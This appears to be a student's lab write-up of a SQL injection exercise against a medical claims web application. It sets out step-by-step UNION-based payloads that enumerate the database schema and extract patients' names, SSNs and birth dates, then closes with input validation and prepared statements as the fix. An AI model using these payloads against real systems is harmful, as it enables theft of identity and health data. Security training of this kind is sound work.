# Vicky Zhao

1. After entering the apostrophe, the java stack trace was returned.
2. The attacker can see that we are using the apache tom cat web server and sql/jdbc.
3. A page displaying the lists of providers is returned along with access to their details.
4. The attacker has learned about the providers' private details.
5. select * from SOMETABLE  
   where somecol = 'VALUE_FROM_SPECIALTY'  
   and somecol like '' or 1=1 or ''%  
   and somecol like 'VALUE_FROM_FIRSTNAME%'
6. The java stack trace comes back.
7. The attacker has learned that the select statements have a different number of columns.
8. ' union select '1', '2', '3', '4', '5', '6', '7', '8', '9', '10
9. It shows that data from columns 2, 4, 3,7 comes back.
10. You can use queries to display data in certain rows using a combination of union and select.
11. ' union select '', 
    table_schema, 
    column_name, 
    table_name, 
    '', 
	'', 
	concat(data_type, privileges), 
	'', 
	'', 
	'' 
	from INFORMATION_SCHEMA.COLUMNS where 1=1 OR '2'='
12. To name a few schemas: infornation schemas, table schemas, constraint schemas, general info, claims, and performance schemas
13. ' union select distinct '', 
    table_schema, 
    table_name, 
    '', 
    '', 
    '', 
    '', 
    '', 
    '', 
    '' 
	from INFORMATION_SCHEMA.COLUMNS 
	where table_schema not in ('information_schema', 'mysql', 	'performance_schema') 
	and 1=1 or '2'='
14. Distinct makes sure that only unique values are displayed.
15. Patients, hospital claims, and beneficiary_hdr all seems like tables with valuable information attackers can be after.
16. ' union select '', 
    column_name, 
    data_type, 
    privileges, 
    '', 
    '', 
    '', 
    '', 
    '', 
    '' 
	from INFORMATION_SCHEMA.COLUMNS 
	where table_schema = 'claims' 
	and table_name = 'patients' 
	and 1=1 or '2'='
17. The columns bith_date, first_name, last_name, and SSN all provide valuable information. Enough to steal your identity.
18. ' union select '', 
    ID, 
	First_Name, 
    last_name, 
    '', 
    '', 
    SSN, 
    '', 
    '', 
    '' 
	from claims.patients
	where 1=1 or '2'='
19. I was able to see the list of all patients alongside their names, id, and ssn.
20. ' union select '', 
    ID, 
	First_Name, 
    last_name, 
    '', 
    '', 
    concat(SSN, ':', birth_date),
    '', 
    '', 
    '' 
	from claims.patients
	where 1=1 or '2'='
21. When you press search, you are redirected to the page that displays the table schema, column/table names, and their privileges.
22. Structured input fields will help prevent sql injection by first validating the user input before accepting it.
23. The attacks no longer work.
24. I don't think that using prepared statements are much harder than regular statements. It just requires a bit of indexing for each parameter. These couple lines of code will greatly increase the security of your app.
25. I think that SQLi is still prevalent today because developers feel rushed to deliver working code and they may skip on implementing security measures.



